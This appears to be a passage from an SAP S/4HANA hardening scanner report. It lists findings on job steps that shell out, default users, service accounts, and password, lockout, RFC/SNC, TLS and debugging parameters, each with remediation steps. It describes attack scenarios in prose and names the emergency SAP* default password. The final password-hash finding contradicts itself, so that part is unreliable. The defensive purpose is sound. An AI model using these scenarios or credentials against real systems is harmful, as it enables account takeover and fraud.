1. Inventory: SM69 / SE16 SXPGCOSTAB -> find OPCOMMAND values that are bare names, start with ./ or ../, or point into /tmp, /var/tmp, /dev/shm, %TEMP%, C:\Temp, C:\Windows\Temp. 2. Redefine each in SM69 with a fully-qualified absolute path to the genuine executable in a root-owned, non-writable directory (e.g., under /usr/sap/<SID>/ or a controlled tools directory). 3. On the OS, have the platform team verify permissions of every referenced program and its parent directory (owned by root/software owner, not group/other-writable) and correct via chmod/chown. 4. Move any required helper scripts out of temp/user-writable paths into a protected directory and re-point the SM69 entry. 5. Audit the PATH and login profiles (.profile/.cshrc) of <sid>adm for writable or attacker-controllable entries and remove them. 6. Restrict S_LOG_COM holders (fields COMMAND, OPSYSTEM, HOST) via PFCG/SUIM so the command cannot be abused even before the path is corrected. 7. Repeat the path validation on every application server (SM51) - mount points and tool locations can differ per host. 8. Verify: SE16 SXPGCOSTAB shows absolute, protected paths; an SM49 test-run resolves to the intended binary; OS 'ls -l' confirms non-writable. 9. Where the program is customer-specific, place it under change control so it cannot be silently replaced. 10. Rollout caution: absolute paths are host/OS-specific - validate on all app servers and test in DEV/QA before transporting to PRD.
References
  • SAP Help — External OS Commands (SM69) path definition
  • SAP Security Baseline — OS command hardening
HIGH P3 · 54 Background job step executes an external OS command / program JOBCMD-JOB-002 ▶
Security Risk
This armed job step is not a normal ABAP report but an external OS command or external program (table TBTCP: XPGFLAG set to external, and/or EXTCMD / XPGPROG populated). It is the realised OS-execution surface of the background scheduler - a job actually wired to shell out. Where the CMD checks describe the command catalog, this shows a job that is armed and will run the external step on schedule. The risk compounds with the catalog findings: a referenced SM69 command that wraps a shell (CMD-001), allows ADDPAR (CMD-002), or resolves to a writable path (CMD-003) makes this a live exploit path. It compounds further with a privileged step user (JOB-001): the OS action then runs with unrestricted authority as <sid>adm. Attack scenario: an attacker with S_BTCH_JOB creates/edits a step of type 'external command' pointing at an ADDPAR-enabled or shell-wrapping SM69 command. Or they add an 'external program' step pointing at a binary they control; the scheduler runs it on the OS under the step user's identity. Execution is non-interactive and low-visibility - there is no dialog session, only a scheduled run. Business impact: scheduled, persistent OS code execution on the S/4HANA application server. Combined with a privileged step user it is full host and data compromise; even with a normal user it exposes the OS layer of the SAP host. It also provides a durable persistence mechanism that survives as an 'approved' job. Real incident: a legitimate 'external program' file-transfer step was re-pointed to a malicious script; because it ran nightly and was an approved job, it evaded review for weeks.
Affected Items (1)
  • JOB_ARCHIVE -> ZBADSHELL (user ZJOBSVC)
Remediation — Step by Step
1. Inventory: SM37 -> open jobs and review steps; or SE16 on TBTCP where XPGFLAG indicates external, or EXTCMD/XPGPROG is populated, to list all external steps and their AUTHCKNAM. 2. For each, confirm the business need and owner (SDLUNAME / change records); delete unjustified steps (SM36/SM37 -> edit job -> delete step). 3. For retained steps, verify the referenced SM69 command is safe: no shell wrap (CMD-001), ADDPAR off (CMD-002), absolute non-writable path (CMD-003), not a destructive utility (CMD-004). 4. Ensure the step user (AUTHCKNAM) is a least-privilege type B background user, never SAP*/DDIC/SAP_ALL (see JOB-001). 5. Prefer ABAP-native processing (standard interfaces, PI/PO/CPI, standard file function modules) over shelling out; retire external steps where an in-system alternative exists. 6. Restrict who can create external steps: authorization objects S_BTCH_JOB and S_LOG_COM via PFCG; review holders with SUIM. 7. Verify: SE16 TBTCP shows only reviewed external steps remain. 8. Run each retained step in QA and confirm expected behaviour; check the SM37 job log and the SM49 trace. 9. Enable Security Audit Log coverage (SM19 / RSAU_CONFIG) so new external steps and their execution are recorded. 10. Rollout caution: external steps often drive real interfaces (bank files, archiving) - coordinate with job owners, test in DEV/QA, and change PRD in a maintenance window with proper transport/documentation.
References
  • SAP Help — External command/program job steps (SM36)
  • SAP Datasheet — table TBTCP (XPGFLAG / EXTCMD / XPGPROG)
HIGH P3 · 54 Users carry open SoD violations with no active mitigating control GRC-ARA-001 ▶
Security Risk
3 user–risk combination(s) have an OPEN segregation-of-duties violation (per GRC risk analysis) with no active mitigating control — either unmitigated, or the mitigation assignment has expired. Unmitigated SoD is the residual access risk external auditors examine first; each is a potential fraud/error exposure (e.g. create vendor + pay vendor).
Affected Items (3)
  • JDOE / P2P_01 (no mitigation)
  • ADMIN2 / BASIS_SEC_01 (mitigation expired/undated)
  • USER_Y / R2R_01 (no mitigation)
Remediation — Step by Step
For each: remove one side of the conflicting access (preferred), or assign a valid, owner-monitored mitigating control with a current validity date in GRAC. Re-run risk analysis to confirm the violation clears.
References
  • SOX ITGC — segregation of duties / residual risk
  • SAP GRC Access Control — ARA risk analysis & mitigation
  • DSAG Prüfleitfaden — SoD-Konflikte
HIGH P3 · 42 Default user SAPCPIC is unlocked USR-001 ▶
Security Risk
This check flags well-known standard SAP accounts (SAP*, DDIC, SAPCPIC, EARLYWATCH, TMSADM) whose lock flag USR02-UFLAG is 0 (unlocked). These accounts ship with documented default passwords and their names and credentials are public knowledge, so they are the first thing any attacker or automated scanner tries. In an S/4HANA RISE landscape the ABAP application layer, including standard-user hygiene, is the customer's responsibility under SAP's shared-responsibility model, so an unlocked SAP*/DDIC is customer exposure, not SAP's. SAP* is especially dangerous: if its user master record is deleted and profile parameter login/no_automatic_user_sapstar is 0, the kernel activates a hard-coded emergency SAP* with password PASS and implicit SAP_ALL, bypassing the user table entirely. DDIC owns the Data Dictionary and is used during upgrades/imports; SAPCPIC is a legacy CPIC/RFC user; TMSADM holds broad transport authorizations across the entire transport domain. Attack scenario: an intruder who reaches SAP GUI, the Fiori/Web GUI logon, or the message server tries the default credentials directly, or brute-forces them because these accounts are dialog-capable. On success they immediately grant themselves SAP_ALL, read HR/finance tables, post fraudulent documents, create backdoor users, run OS commands via SM49, or pivot across the transport domain into DEV/QA/PRD. A real incident looks like an off-hours SAP* or DDIC dialog logon from an unusual terminal followed by SU01 user creation and profile assignment. This is a textbook critical audit finding under SOX ITGC, and unauthorized access to financially-relevant and personal data also drives GDPR/data-breach exposure.
Affected Items (1)
  • SAPCPIC
Remediation — Step by Step
1. Run report RSUSR003 (via SA38 or SUIM) in every client (000, 001, 066 and all productive clients) to list SAP*, DDIC, SAPCPIC, EARLYWATCH, TMSADM and see which still have default passwords or are unlocked. 2. For each client, in SU01 set a strong random password and apply an administrator lock to SAP* and DDIC (this sets USR02-UFLAG); only unlock DDIC temporarily for upgrades/imports, then re-lock it. 3. Secure the SAP* emergency logon: set profile parameter login/no_automatic_user_sapstar = 1 in RZ10 (DEFAULT/instance profile), activate the profile, and restart the instance in a maintenance window; verify the runtime value with RZ11. 4. Ensure a real SAP* user master record exists in every client so the hard-coded fallback cannot activate; never delete SAP*. 5. For TMSADM, follow SAP Note 1414256 to change its password consistently across the whole transport domain, then restrict its authorizations to the minimum transport scope. 6. Lock SAPCPIC and EARLYWATCH if unused; if EarlyWatch is active, restrict it to minimal monitoring authorizations. 7. Use SU10 for mass lock/password changes when many clients/accounts are affected. 8. Verify by re-running RSUSR003 (no default passwords, standard users locked) and confirming USR02-UFLAG > 0 for SAP*/DDIC. 9. Enable the Security Audit Log (RSAU_CONFIG / SM19) with a filter to alert on any dialog logon by these accounts. 10. Caution: locking DDIC can break scheduled imports/upgrades and the SAP* parameter change needs an instance restart, so test in DEV/QA and schedule a maintenance window with Basis.
References
  • SAP Note 1414256 — Secure default users
  • CIS SAP Benchmark Section 2.1

HIGH P3 · 42 Service/technical accounts with dialog logon type USR-004 ▶
Security Risk
This check flags accounts named like service/technical IDs (prefixes SVC_, RFC_, BATCH_, BG_, INT_, API_, TECH_) that still carry user type A (Dialog), meaning they can be used for interactive SAP GUI/Fiori logon with credentials embedded in interfaces and batch jobs. Technical accounts are dangerous when interactive because their passwords are widely known to integration teams, are seldom rotated, are often stored in cleartext in RFC destinations (SM59), config files and scripts, and frequently hold broad RFC, batch or cross-client authorizations. SAP user types exist precisely to prevent this: types C (Communication/CPIC) and B (System/background) cannot perform dialog logon, whereas A (Dialog) and S (Service) can. Attack scenario: an attacker extracts an RFC/interface password from a config file, a memory dump, a captured RFC call or a decompiled middleware job, then logs on interactively as that technical user via SAP GUI, abusing its standing authorizations to read tables, run reports and pivot; because it is a shared service ID, attribution and detection are poor. In RISE/BTP, integration users bridging BTP, SAP Integration Suite/PI-PO and third-party middleware are prime targets. Business impact: undetected privileged access, an SoD failure (a technical ID performing interactive work), and audit findings on shared-account accountability. A real incident: reuse of a leaked RFC_ password for an interactive logon that pulls a full customer-master extract.
Affected Items (4)
  • SVC_RFC_01 (type=A)
  • RFC_BILLING (type=A)
  • BATCH_FIN (type=A)
  • INT_ARIBA (type=A)
Remediation — Step by Step
1. Inventory technical accounts and their type with RSUSR200/SUIM filtered on user type, review naming conventions, and cross-check SM59 for the users that RFC destinations authenticate as. 2. For each genuinely non-interactive account, change USR02-USTYP in SU01 (Logon Data > User Type) to C (Communication) for RFC/CPIC, B (System) for background/batch and internal jobs, or S (Service) only where a technical dialog is truly required. 3. Prefer type C or B for interface and batch IDs so dialog logon is impossible at the kernel level. 4. Rotate the passwords of all affected technical users after the type change, store them in a secrets vault rather than scripts, and update SM59 destinations and job definitions accordingly. 5. Restrict authorizations to the minimum the interface needs (for example specific S_RFC function groups) rather than broad profiles. 6. Where possible migrate RFC/interface authentication to trusted-system RFC or SNC/certificate-based authentication to remove shared passwords. 7. Verify by attempting a dialog logon with a converted account (rejected for type B/C) and confirming the interface/batch job still runs successfully in QA. 8. Enable Security Audit Log (RSAU_CONFIG) alerts for dialog logons by technical user IDs. 9. Caution: changing a user type or password can break live interfaces and scheduled jobs, so coordinate with each interface owner, schedule during a low-volume window and test end-to-end in non-prod first. 10. Document the correct type per technical account in the interface register so future provisioning stays consistent.
References
  • SAP Note 2175909
HIGH P3 · 42 Parameter login/min_password_lng non-compliant PARAM-login/min_password_lng ▶
Security Risk
login/min_password_lng sets the minimum length of ABAP dialog/logon passwords; the SAP kernel default is only 6 characters (allowed range 3-40). A short minimum dramatically shrinks the password keyspace and makes both online guessing and, more importantly, offline cracking of captured password hashes fast and cheap. SAP historically stored password hashes in table USR02 (fields BCODE/PASSCODE and the newer PWDSALTEDHASH); the legacy hash formats are weak, and even the salted iSSHA-1 hash succumbs quickly to GPU cracking when the underlying password is only 6-8 characters. An attacker who obtains a USR02 dump - via a database read, an over-privileged S_TABU_DIS/S_TABU_NAM authorization, a backup, or SQL injection in a custom report - can crack short passwords to plaintext and then log on interactively as those users, including privileged ones. In S/4HANA RISE the same risk applies to any password-based dialog/communication users that remain (SSO/SAML reduces but rarely eliminates them). Business impact: account takeover of Finance/Basis users, fraudulent postings, data exfiltration, and privilege escalation, all appearing as 'legitimate' logons. Compliance impact: violates CIS SAP, SAP Security Baseline password strength expectations, and SOX/ISO password-strength controls. A real incident looks like a valid-credential logon from an unusual source shortly after a database or backup exposure, with the compromised account traced back to a trivially crackable short password.
Affected Items (1)
  • login/min_password_lng = 6
Remediation — Step by Step
1. Confirm the current value in RZ11 for login/min_password_lng and review related parameters login/password_downwards_compatibility and login/password_hash_algorithm. 2. In RZ10 edit the DEFAULT profile and set login/min_password_lng to at least 8, with 10-12 recommended per SAP Security Baseline and DSAG guidance. 3. Also harden the password-composition parameters (login/min_password_digits, _letters, _specials) so length increases do not push users to predictable patterns. 4. Set login/password_downwards_compatibility = 0 once no legacy/older-release RFC partners require the old hash, to eliminate the weak BCODE hash from USR02. 5. Save and activate the profile; the login/* parameters are dynamically switchable, but persist them in the profile and restart the instance during a maintenance window for durability. 6. Force adoption by setting login/password_compliance_to_current_policy = 1 so existing non-compliant passwords must be changed at next logon. 7. Verify with RSPARAM that the active value is >= 8 and with RZ11 that it is applied on every instance. 8. Restrict read access to USR02 by reviewing S_TABU_DIS/S_TABU_NAM assignments (SUIM) so hashes cannot be dumped. 9. Roll out first in DEV/QA and notify the service desk of increased password-reset volume before production. 10. Re-run the scanner to confirm PARAM-login/min_password_lng is compliant.
References
  • SAP Note 3250501 — mandatory hardening for AS ABAP in SAP ECS (v46, 2026-05-15)
HIGH P3 · 42 Parameter login/fails_to_session_end non-compliant PARAM-login/fails_to_session_end ▶
Security Risk
login/fails_to_session_end determines how many consecutive incorrect logon attempts are tolerated within a single session before the SAP GUI/logon session is terminated (the connection is dropped). The default is 3. If this value is set too high (or the control is effectively disabled), an attacker can keep hammering credentials within one session without the session being torn down, materially accelerating online password-guessing and credential-spraying against a target user ID. While login/fails_to_user_lock is the stronger sibling control (it locks the account), fails_to_session_end is the first-line brake that forces the attacker to re-establish sessions and slows automated tooling. In an internet-adjacent or broadly-reachable S/4HANA / Fiori landscape, a permissive value lets an adversary iterate through dictionaries against known accounts far more efficiently. Attack scenario: an attacker scripts logon attempts against a privileged user ID; with a high fails-to-session-end the tooling never gets interrupted and can exhaust a wordlist quickly, especially when combined with weak password complexity. Business impact: increased likelihood of successful brute-force account takeover, which then leads to fraud, data exfiltration or privilege escalation. Compliance impact: violates CIS SAP 1.2.1 and SAP Security Baseline logon-attempt limits. A real incident would present as a burst of failed logons that were never throttled, culminating in a successful logon on the same user ID.
Affected Items (1)
  • login/fails_to_session_end = 5
Remediation — Step by Step
1. Review the current value in RZ11 for login/fails_to_session_end. 2. In RZ10 edit the DEFAULT profile and set login/fails_to_session_end to 3 or fewer. 3. Set the stronger companion control login/fails_to_user_lock to 5 or fewer so the account is actually locked, not just the session ended. 4. Set login/failed_user_auto_unlock = 0 so a locked account stays locked until an administrator unlocks it (prevents automatic midnight unlock that resets the attacker's budget). 5. Save and activate the DEFAULT profile; login/* parameters are dynamically switchable but keep them in the profile for durability. 6. Ensure the Security Audit Log (rsau/enable) captures failed logons so brute-force patterns are detectable in SM20/RSAU_READ_LOG. 7. Verify the active value with RSPARAM and confirm across all instances via RZ11. 8. Front-end Fiori/web logons should additionally be protected at the Web Dispatcher/WAF layer against distributed guessing. 9. Pilot in DEV/QA and confirm no legitimate automated logon repeatedly mistypes credentials before enforcing. 10. Re-run the scanner to confirm compliance.
References
  • SAP Note 3250501 — mandatory hardening for AS ABAP in SAP ECS (v46, 2026-05-15)
HIGH P3 · 42 Parameter login/fails_to_user_lock non-compliant PARAM-login/fails_to_user_lock ▶
Security Risk
login/fails_to_user_lock sets the number of consecutive failed logon attempts after which SAP locks the user account; the default is 5. This is the primary defence against online password brute-forcing and credential spraying. If the value is too high or the lockout is weakened, an attacker can make a large number of guesses against a user ID before being stopped, and with weak password complexity that is often enough to succeed. A related pitfall is login/failed_user_auto_unlock = 1, which automatically unlocks accounts at midnight, effectively giving the attacker a fresh budget of attempts every day and allowing slow-and-low guessing to eventually break in without ever tripping a permanent lock. In an S/4HANA landscape reachable by many users (and via RFC/web front-ends), a permissive lockout policy is one of the most directly exploitable weaknesses. Attack scenario: an adversary enumerates valid user IDs and sprays common passwords across them, staying under the per-account limit, or targets one privileged ID with a dictionary while relying on nightly auto-unlock. Success yields a valid logon and full use of the victim's authorizations. Business impact: account takeover leading to fraud, unauthorized data access, and lateral movement. Compliance impact: violates CIS SAP 1.2.2 and the SAP Security Baseline. A real incident would look like repeated failed logons across many accounts (spray) or a single account, followed by a successful authentication.
Affected Items (1)
  • login/fails_to_user_lock = 10
Remediation — Step by Step
1. Check the current value in RZ11 for login/fails_to_user_lock. 2. In RZ10 edit the DEFAULT profile and set login/fails_to_user_lock to 5 or fewer. 3. Set login/failed_user_auto_unlock = 0 so locked accounts remain locked until an administrator unlocks them via SU01. 4. Keep login/fails_to_session_end at 3 or fewer as the complementary session-drop control. 5. Save and activate the DEFAULT profile; login/* parameters are dynamic but persist them in the profile. 6. Enable the Security Audit Log (rsau/enable=1) and create SM20/RSAU_READ_LOG monitoring for repeated failed logons and lock events, ideally forwarded to the SIEM. 7. Verify the active value with RSPARAM and confirm on every instance via RZ11. 8. Establish a help-desk process for verified unlock requests so the stricter lockout does not create denial-of-service for legitimate users, and monitor for lockout-based DoS against specific IDs. 9. Pilot in DEV/QA and communicate the tighter lockout to users before production enforcement. 10. Re-run the scanner to confirm compliance.
References
  • SAP Note 3250501 — mandatory hardening for AS ABAP in SAP ECS (v46, 2026-05-15)
HIGH P3 · 42 Parameter rfc/reject_insecure_logon non-compliant PARAM-rfc/reject_insecure_logon ▶
Security Risk
This check flags that RFC logons are permitted over insecure (unauthenticated/unencrypted) channels. Note that rfc/reject_insecure_logon is not a standard SAP profile-parameter name - the real, SAP-supported enforcement of 'reject insecure RFC logon' is achieved through the SNC parameters (snc/enable, snc/accept_insecure_rfc, snc/only_encrypted_rfc) and related RFC hardening (rfc/reject_expired_passwd), so the underlying risk is that inbound RFC connections can authenticate without Secure Network Communications. When RFC traffic is not protected by SNC, credentials and payloads traverse the network in a form that can be intercepted or replayed, and the system accepts logons that are not cryptographically protected. In an S/4HANA landscape with many RFC destinations (S/4-to-BW, PI/PO, Solution Manager, third-party middleware), an attacker positioned on the network can sniff RFC logon data, capture trusted-system assertions, or perform man-in-the-middle attacks, then reuse the captured authentication to log on to the target system with the source system's rights. This directly enables lateral movement across the SAP landscape and is the class of weakness exploited by RFC capture-replay attacks. Business impact: cross-system compromise, data exfiltration, and privilege escalation via trusted-RFC chains. Compliance impact: violates the SAP Security Baseline's secure-communication requirements. A real incident would look like an RFC logon to a production system originating from captured/relayed credentials, invisible unless SNC and auditing are in place.
Affected Items (1)
  • rfc/reject_insecure_logon = 0
Remediation — Step by Step
1. Because the exact parameter as named is non-standard, base remediation on the real SNC controls: verify current values in RZ11 for snc/enable, snc/accept_insecure_rfc, snc/only_encrypted_rfc and snc/log_unencrypted_rfc. 2. In RZ10 (DEFAULT profile) set snc/enable = 1 to activate Secure Network Communications for the instance. 3. Set snc/accept_insecure_rfc = 0 so unprotected inbound RFC logons are rejected (use U with a documented allow-list only during migration). 4. Set snc/only_encrypted_rfc = 1 to force encryption on RFC, and snc/log_unencrypted_rfc = 2 first to discover any remaining cleartext callers before you enforce. 5. Set rfc/reject_expired_passwd = 1 so RFC logons with expired passwords are refused. 6. Configure the SNC PSE/credentials in STRUST and the SNC name mappings, and update SM59 destinations to use SNC (activate 'SNC active' with the partner's SNC name). 7. Save/activate the profile and restart the instance in a maintenance window (SNC activation requires restart). 8. Verify with RSPARAM that the SNC parameters are active and test each SM59 destination's 'Connection Test' and 'Authorization Test'. 9. Roll out landscape-wide in coordination with every interface owner - enabling snc/accept_insecure_rfc=0 will break any partner not yet on SNC, so migrate and log first, then enforce. 10. Re-run the scanner and confirm insecure RFC logon is no longer possible.
References
  • SAP Note 2416093
  • CIS SAP Benchmark 4.1
HIGH P3 · 42 Parameter rfc/reject_insecure_logon_data non-compliant PARAM-rfc/reject_insecure_logon_data ▶
Security Risk
This check flags that RFC data transmission may occur over an insecure (unencrypted) channel. As with its sibling, rfc/reject_insecure_logon_data is not a standard SAP profile-parameter name; the genuine SAP mechanism for enforcing encrypted RFC data transport is SNC (snc/enable, snc/only_encrypted_rfc, snc/data_protection/min|max|use set to 3 = privacy/encryption). The underlying risk is therefore that RFC payloads - which routinely carry business data, credentials embedded in destinations, and trusted-system tickets - move across the network without confidentiality or integrity protection. An attacker with network visibility (a compromised host on the same segment, a rogue admin, or a poorly segmented cloud VPC in a RISE deployment) can passively capture sensitive data in transit (financial records, PII, HR data) and can tamper with or replay RFC calls. Capture-replay of trusted-RFC assertions specifically enables logging on to a trusting system with the source system's authorizations, chaining one compromised system into many. In S/4HANA RISE, where connectivity between the ABAP system, BTP services and on-premise systems may traverse various network paths, unencrypted RFC is a real exposure. Business impact: data breach (GDPR-relevant if PII is carried), integrity loss on interface data, and lateral movement. Compliance impact: fails SAP Security Baseline transport-protection and GDPR Art. 32 encryption-in-transit expectations. A real incident would look like sensitive interface data recovered from a network capture, or manipulated RFC payloads producing fraudulent records.
Affected Items (1)
  • rfc/reject_insecure_logon_data = 0
Remediation — Step by Step
1. Treat this as an SNC encryption-in-transit control; verify current values in RZ11 for snc/enable, snc/only_encrypted_rfc and snc/data_protection/min, /max and /use. 2. In RZ10 (DEFAULT profile) set snc/enable = 1. 3. Set snc/data_protection/min = 3, snc/data_protection/max = 3 and snc/data_protection/use = 3 to enforce privacy protection (encryption) on SNC-protected connections. 4. Set snc/only_encrypted_rfc = 1 (and snc/only_encrypted_gui = 1 where applicable) so RFC/GUI data is always encrypted. 5. Use snc/log_unencrypted_rfc = 2 during the migration phase to identify any destinations still sending cleartext before you enforce. 6. Configure the SNC PSE and credentials in STRUST and update each SM59 destination to activate SNC with quality of protection 'privacy'. 7. Save/activate the profile and restart the instance in a maintenance window; SNC changes require restart. 8. Verify with RSPARAM and by running SM59 connection/authorization tests on all destinations; check that data protection is applied. 9. Coordinate the rollout with all interface and middleware owners (PI/PO, BW, SolMan, third parties) - forcing encryption breaks partners not configured for SNC, so log first, migrate, then enforce. 10. Re-run the scanner to confirm insecure RFC data transmission is eliminated.
References
  • SAP Note 2416093
HIGH P3 · 42 Parameter ssl/ciphersuites non-compliant PARAM-ssl/ciphersuites ▶
Security Risk
ssl/ciphersuites (and its client counterpart ssl/client_ciphersuites) defines which TLS protocol versions and cipher suites the SAP server offers/accepts for HTTPS and other TLS traffic via the CommonCryptoLib. If it is left unset/at defaults, the system may negotiate weak or legacy protocols and ciphers - older TLS versions, non-PFS key exchange, or weak algorithms - exposing encrypted channels to downgrade and interception attacks. Weak TLS on an S/4HANA / Fiori / Web Dispatcher front-end means an attacker able to intercept traffic (network foothold, rogue proxy, or a poorly isolated cloud path in a RISE deployment) can potentially decrypt or manipulate sessions, harvesting credentials, session cookies (SAP logon/assertion tickets) and business data in transit. Downgrade attacks force the connection to the weakest mutually supported suite, so a single legacy option can undermine the whole endpoint. Business impact: interception of authentication material and PII/financial data (GDPR-relevant), session hijacking, and man-in-the-middle tampering. Compliance impact: fails CIS SAP 5.1, the SAP Security Baseline transport-security requirements, and PCI/GDPR encryption-in-transit expectations. A real incident would look like credentials or ticket cookies captured off a weakly-encrypted session and replayed to gain access, or an external assessment flagging TLS 1.0/1.1 and weak ciphers on the public HTTPS endpoint.
Affected Items (1)
  • ssl/ciphersuites =
Remediation — Step by Step
1. Ensure the system uses a current CommonCryptoLib (SAPCRYPTOLIB) patch level, as cipher-string capabilities depend on it (see SAP Note 510007 and the CommonCryptoLib notes). 2. Verify the current values in RZ11 for ssl/ciphersuites and ssl/client_ciphersuites. 3. In RZ10 set a strong, PFS-first cipher string, for example ssl/ciphersuites = 135:PFS:HIGH::EC_P256:EC_HIGH and ssl/client_ciphersuites = 150:PFS:HIGH::EC_P256:EC_HIGH (the leading number selects the minimum TLS protocol/behaviour per SAP documentation), restricting to TLS 1.2+ and strong AES/ECDHE suites. 4. Confirm the exact recommended cipher string for your release and any regulatory requirement (TLS 1.2/1.3, AES-256) using SAP's CommonCryptoLib/ssl documentation rather than guessing values. 5. Save/activate the profile and restart the ICM (SMICM) or instance so the new suites take effect. 6. If a Web Dispatcher fronts the system (typical in RISE), apply matching strong ssl/ciphersuites there too, since TLS is often terminated at that layer. 7. Verify with an external TLS scan (or SMICM trace) that only TLS 1.2+ and strong ciphers are offered and that legacy protocols are refused. 8. Check for legacy clients/interfaces that may only support old ciphers before enforcing, to avoid breaking connectivity. 9. Pilot in DEV/QA and coordinate with interface and Web Dispatcher owners before production rollout. 10. Re-run the scanner to confirm ssl/ciphersuites is explicitly and securely configured.

HIGH P3 · 42 Parameter rec/client non-compliant PARAM-rec/client ▶
Security Risk
rec/client controls table logging - specifically which client(s) have change logging active for tables flagged as log-relevant (those whose technical settings have the 'Log data changes' flag set). It accepts values such as OFF, ALL, or a specific client/list. When rec/client is not configured (or set to OFF), changes to critical customizing and configuration tables are not recorded even if the tables are marked for logging, removing a key audit trail for configuration and master-data-control changes. This matters because many high-impact fraud and sabotage actions are configuration changes rather than transactions - e.g. altering tolerance groups, payment/banking configuration, number ranges, or currency/exchange-rate tables. Without table change logging, such changes cannot be attributed or reconstructed. In an S/4HANA landscape subject to SOX, change-management evidence for these tables is expected; missing table logging undermines both detective control and audit evidence. Attack scenario: a malicious insider with configuration access changes a payment-relevant customizing table to redirect funds or suppress a control, then reverts it - with rec/client off there is no record the change ever occurred. Business impact: undetectable configuration fraud, loss of change-audit evidence, and SOX ITGC/change-management findings. Compliance impact: violates CIS SAP 6.2 and change-logging expectations of the SAP Security Baseline and SOX. A real incident would look like an unexplained configuration state change with no history in the change-document/table-log records to explain who did it or when.
Affected Items (1)
  • rec/client =
Remediation — Step by Step
1. Verify the current value in RZ11 for rec/client. 2. In RZ10 set rec/client to log the relevant client(s) - use rec/client = ALL to log all clients, or list the productive client number(s) explicitly (e.g. rec/client = 100) per policy. 3. Ensure the tables you care about actually have the 'Log data changes' flag enabled in their technical settings (SE13 / the ABAP Dictionary technical settings) - rec/client only takes effect for tables marked log-relevant; SAP delivers many critical customizing tables pre-flagged. 4. Save/activate the profile; rec/client generally requires an instance restart, so schedule a maintenance window. 5. Verify by making a test change to a logged table and reviewing the log via SCU3 (report RSVTPROT) to confirm the change was recorded with user and timestamp. 6. Confirm log retention and periodic review of table-change logs are in place (and forwarded to SIEM where feasible) so the trail is actually used. 7. Assess performance/volume impact in DEV/QA first, since broad logging on high-write tables adds overhead; scope table flags sensibly rather than enabling logging on transactional mass tables. 8. Coordinate with the change-management and audit teams to align logged tables with SOX-relevant configuration. 9. In RISE/ECS coordinate the restart with the SAP-managed operations team. 10. Re-run the scanner to confirm rec/client is configured.
References
  • SAP Note 3250501 — mandatory hardening for AS ABAP in SAP ECS (v46, 2026-05-15)
HIGH P3 · 42 Parameter rdisp/wpdbug_max_no non-compliant PARAM-rdisp/wpdbug_max_no ▶
Security Risk
rdisp/wpdbug_max_no sets the maximum number of work processes that may be used simultaneously for ABAP debugging. It is relevant in production because the ABAP debugger is not merely a viewer - with the 'Debug & Replace' capability a user can change the value of internal variables at runtime, altering program flow to bypass authorization checks, force a control to pass, or manipulate financial figures before they are posted. If debugging is broadly permitted in production (and combined with debug authorizations), a user can, for example, stop in a posting or approval program, overwrite the amount or the authorization result, and let execution continue - producing fraudulent postings that look legitimate. Setting rdisp/wpdbug_max_no = 0 disables the use of debug work processes and is a strong technical brake on production debugging (it complements, but does not replace, restricting the S_DEVELOP authorization for DEBUG with change activity). In an S/4HANA production system, uncontrolled debugging is a direct fraud and privilege-escalation vector. Attack scenario: an insider with debug-change authorization halts execution in a payment run, uses Replace to change a vendor bank field or an authorization flag in memory, and completes the run - the Security Audit Log may record the debug event, but the fraudulent outcome is posted. Business impact: financial fraud, authorization bypass, data integrity loss. Compliance impact: violates CIS SAP 7.1 and SoD/production-change controls expected under SOX. A real incident would look like debug-and-replace activity in the SAL correlated with an anomalous posting.
Affected Items (1)
  • rdisp/wpdbug_max_no = 2
Remediation — Step by Step
1. Verify the current value in RZ11 for rdisp/wpdbug_max_no and review the intended production-support model. 2. In RZ10 set rdisp/wpdbug_max_no = 0 on production instances to disable debug work processes (allow debugging only in DEV/QA). 3. Save/activate the profile; this parameter requires an instance restart, so schedule a maintenance window. 4. Independently and importantly, restrict the debug authorization: ensure no production dialog user holds S_DEVELOP with object type DEBUG and activity 02 (change / Debug & Replace) - display-only debug (activity 03) is far less dangerous but should still be tightly limited; review assignments via SUIM. 5. Also restrict S_DEVELOP for other development activities and lock down SE38/SE24/SE80/SE16-family transactions in production via role design. 6. Ensure the Security Audit Log (rsau/enable) records debugging and debug-replace events and that these are monitored/alerted in the SIEM. 7. Verify by attempting to start a debugging session in production and confirming debug work processes are unavailable, and by re-checking S_DEVELOP DEBUG assignments. 8. Provide a controlled firefighter/emergency-access process (e.g. via GRC firefighter) for the rare legitimate production debug need, with logging and approval. 9. Roll out in DEV/QA first, and coordinate with support teams who may currently rely on production debugging so alternative procedures are in place. 10. Re-run the scanner to confirm rdisp/wpdbug_max_no = 0 in production.

HIGH P3 · 42 Parameter login/password_hash_algorithm non-compliant PARAM-login/password_hash_algorithm ▶
Security Risk
The one-way function, work factor and salt size used to store password hashes. It decides what an attacker who obtains the password table can recover offline, and it governs every dialog user at once regardless of how strong the composition rules are. Current value: 'encoding=RFC2307, algorithm=iSSHA-1, iterations=1024, saltsize=96'. The ECS standard value is 'encoding=RFC2307, algorithm=iSSHA-512, iterations=15000, saltsize=256'. SAP permits no exception to this value. Checked here: encoding=RFC2307, algorithm=iSSHA-512, iterations=15000, saltsize=256. Verified: encoding and algorithm match the mandated construction, and iterations and saltsize are at least the mandated work factors (a higher value is accepted as a hardening).

Remediation — Step by Step
Set login/password_hash_algorithm to the mandated construction and work factors, then force a password change so the new hashes are generated. In an ECS/RISE tenant profile parameters are maintained by SAP: raise a service request quoting SAP Note 3250501 rather than attempting the change in RZ10.
